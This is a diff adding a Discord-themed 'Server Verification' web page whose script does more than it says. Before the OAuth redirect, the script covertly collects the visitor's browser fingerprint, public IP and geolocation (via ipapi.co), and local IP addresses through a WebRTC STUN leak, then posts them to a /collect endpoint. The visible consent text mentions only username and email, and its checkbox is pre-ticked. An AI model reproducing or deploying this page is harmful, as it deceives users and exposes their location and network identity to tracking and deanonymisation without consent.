@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Server Verification</title>
+<style>
+  :root { --bg: #313338; --card: #2b2d31; --text: #dbdee1; --muted: #949ba4; --blurple: #5865f2; --input: #1e1f22; --border: #3f4147; }
+  * { box-sizing: border-box; }
+  body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); font-family: sans-serif; display: flex; align-items: center; justify-content: center; padding: 20px; }
+  .card { background: var(--card); border-radius: 8px; padding: 32px; box-shadow: 0 8px 24px rgba(0,0,0,.45); text-align: center; max-width: 480px; width: 100%; }
+  .app-icon { width: 80px; height: 80px; border-radius: 50%; background: var(--input); margin: 0 auto 16px; overflow: hidden; }
+  .app-icon img { width: 100%; height: 100%; object-fit: cover; }
+  h1 { font-size: 22px; color: #fff; margin: 0 0 8px; }
+  .sub { color: var(--muted); font-size: 14px; margin: 0 0 24px; }
+  .info-box { background: var(--input); border: 1px solid var(--border); border-radius: 6px; padding: 16px; text-align: left; margin-bottom: 20px; font-size: 13px; }
+  .consent { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; color: var(--muted); text-align: left; margin-bottom: 16px; cursor: pointer; }
+  button { width: 100%; padding: 11px; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; background: var(--blurple); color: #fff; }
+  button:disabled { opacity: .5; cursor: not-allowed; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="app-icon">
+    <img src="https://static.wikia.nocookie.net/roblox-tower-battles/images/c/cd/DefaultGraveyard-Level2.png/revision/latest?cb=20241030203837">
+  </div>
+  <h1>Server Verification</h1>
+  <p class="sub"><b>Verification Bot</b> requires you to verify.</p>
+  <div class="info-box">
+    <ul>
+      <li>Access your username and email</li>
+      <li>Add you to the server and assign a role</li>
+    </ul>
+  </div>
+  <label class="consent">
+    <input type="checkbox" id="consent" checked>
+    <span>I authorize this application to access my account data.</span>
+  </label>
+  <button id="verifyBtn" onclick="startVerification()">Verify & Authorize</button>
+</div>
+
+<script>
+const REDIRECT_URI = window.location.origin + '/callback';
+const DISCORD_CLIENT_ID = '1567761531213586565';
+
+const btn = document.getElementById('verifyBtn');
+const consent = document.getElementById('consent');
+
+consent.addEventListener('change', () => { btn.disabled = !consent.checked; });
+
+async function startVerification() {
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+  const stateId = Math.random().toString(36).substring(2, 15);
+  const report = await collectData();
+
+  try {
+    await fetch('/collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: stateId, data: report })
+    });
+  } catch (e) { console.error(e); }
+
+  const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join&state=${stateId}`;
+  window.location.href = oauthUrl;
+}
+
+async function collectData() {
+    const n = navigator;
+    const report = { ua: n.userAgent, platform: n.platform, screen: { width: screen.width, height: screen.height } };
+    try {
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geoData = await geoRes.json();
+        report.publicIp = geoData.ip;
+        report.geo = { city: geoData.city, country: geoData.country_name, org: geoData.org };
+    } catch(e) {}
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        const localIps = new Set();
+        pc.onicecandidate = e => {
+            if (!e.candidate) return;
+            const match = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/);
+            if (match) localIps.add(match[1]);
+        };
+        await new Promise(r => setTimeout(r, 1500));
+        report.localIps = [...localIps];
+        pc.close();
+    } catch(e) {}
+    return report;
+}
+</script>
+</body>
+</html>
